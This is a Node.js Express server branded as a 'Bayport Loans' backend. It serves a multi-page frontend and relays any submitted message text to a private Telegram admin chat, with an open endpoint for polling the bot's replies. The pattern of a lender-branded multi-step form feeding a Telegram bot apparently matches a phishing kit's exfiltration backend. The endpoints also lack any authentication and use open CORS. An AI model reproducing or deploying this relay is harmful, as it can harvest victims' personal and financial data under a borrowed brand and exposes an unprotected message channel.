// ==================== LOAD ENV FIRST ====================
require('dotenv').config();

// ==================== IMPORTS ====================
const express = require('express');
const cors = require('cors');
const path = require('path');
const morgan = require('morgan');
const axios = require('axios');

// ==================== INIT ====================
const app = express();
const PORT = process.env.PORT || 5000;

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(morgan('dev'));

// ==================== STATIC FILES - SERVE FRONTEND ====================
// Serve all static files from the frontend folder
app.use(express.static(path.join(__dirname, 'frontend')));

// ==================== API ROUTES ====================

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Bayport Loans Backend Running',
        timestamp: new Date().toISOString()
    });
});

// Send message to Telegram
app.post('/api/send-message', async (req, res) => {
    try {
        const { message } = req.body;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.ADMIN_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ 
                success: false, 
                error: 'Missing Telegram configuration' 
            });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('Telegram Error:', error.response?.data || error.message);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message
        });
    }
});

// Get updates from Telegram
app.get('/api/get-updates/:offset?', async (req, res) => {
    try {
        const offset = req.params.offset || 0;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;

        if (!botToken) {
            return res.status(500).json({ 
                success: false, 
                error: 'Missing Telegram configuration' 
            });
        }

        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/getUpdates`,
            {
                params: {
                    offset: offset,
                    timeout: 30,
                    allowed_updates: ['message']
                }
            }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to get updates from Telegram' 
        });
    }
});

// ==================== FRONTEND ROUTES ====================

// Serve index.html for root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/index.html'));
});

// Serve page2.html
app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page2.html'));
});

// Serve page3.html
app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/page3.html'));
});

// Serve success.html
app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend/success.html'));
});

// ==================== ERROR HANDLING ====================

// 404 handler for API routes
app.use('/api/*', (req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'API endpoint not found' 
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server Error:', err.stack);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// ==================== START SERVER ====================

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔════════════════════════════════════════════╗
    ║     🚀 BAYPORT LOANS BACKEND SERVER       ║
    ╠════════════════════════════════════════════╣
    ║  📡 Port: ${PORT}                             ║
    ║  🌍 Environment: ${process.env.NODE_ENV || 'development'}        ║
    ║  📁 Frontend: ${path.join(__dirname, 'frontend')}  ║
    ║  🤖 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not Configured'}         ║
    ╚════════════════════════════════════════════╝
    `);
});